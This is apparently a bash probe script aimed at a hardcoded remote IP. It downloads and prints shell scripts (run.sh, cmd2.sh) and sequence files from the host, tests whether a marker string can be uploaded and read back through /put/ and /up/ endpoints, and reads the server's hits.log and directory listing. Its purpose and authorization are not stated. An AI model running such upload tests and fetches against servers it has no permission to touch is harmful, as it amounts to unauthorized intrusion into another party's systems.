#!/bin/bash
set +e
H=123.184.7.135
log(){ echo "$@"; }
log "### GV9 $(date -u +%FT%TZ)"
log "### RUN.SH"; timeout 10 curl -s "http://$H:8099/run.sh"; echo
log "### SEQ"; timeout 10 curl -s "http://$H:8099/seq"; echo
log "### SEQ2"; timeout 10 curl -s "http://$H:8099/seq2"; echo
log "### CMD2-HEAD"; timeout 10 curl -s "http://$H:8099/cmd2.sh" | head -c 1500; echo
log "### MARKER-RETRY"
TS=$(date +%s)
timeout 10 curl -s -X POST --data-binary "UL5817M$TS" "http://$H:8099/put/ul5817m_$TS.txt"; echo
sleep 1
timeout 10 curl -s -o /tmp/g1 -w 'get-root %{http_code}\n' "http://$H:8099/ul5817m_$TS.txt"; cat /tmp/g1 | head -c 120; echo
timeout 10 curl -s -o /tmp/g2 -w 'get-updir %{http_code}\n' "http://$H:8099/up/ul5817m_$TS.txt"; head -c 120 /tmp/g2; echo
log "### HITS-TAIL"; timeout 10 curl -s "http://$H:8099/hits.log" | tail -20
log "### PYSRV-HINT"; timeout 10 curl -s "http://$H:8099/" | grep -oE 'href="[^"]+"' | head -60
log "### DONE9"
